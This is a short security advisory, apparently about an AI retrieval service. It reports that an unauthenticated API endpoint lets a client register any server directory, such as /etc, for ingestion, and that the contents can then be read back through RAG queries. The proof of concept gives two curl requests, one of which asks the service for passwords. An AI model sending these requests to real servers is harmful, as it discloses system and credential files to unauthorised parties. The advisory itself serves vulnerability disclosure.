# localdir registration → RAG arbitrary file disclosure

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description
POST /v1/data_source accepts any localdir uri without path validation; ingestion copies and chunks it.

## Impact
Unauthenticated client registers server directory → contents queryable via RAG.

## PoC
```
```bash
# 1. Register any server directory as a data source (no auth):
curl -X POST http://<cognita>:8000/v1/data_source \
  -H "Content-Type: application/json" \
  -d '{"type": "localdir", "uri": "/etc", "parser_config": {}}'

# 2. Create a collection ingesting this data source

# 3. Query RAG to read the ingested contents:
curl -X POST http://<cognita>:8000/retrievers/basic-rag/answer \
  -H "Content-Type: application/json" \
  -d '{"query": "What are the passwords?"}'
```
```

## Execution result
```
REPRODUCED: 201
```
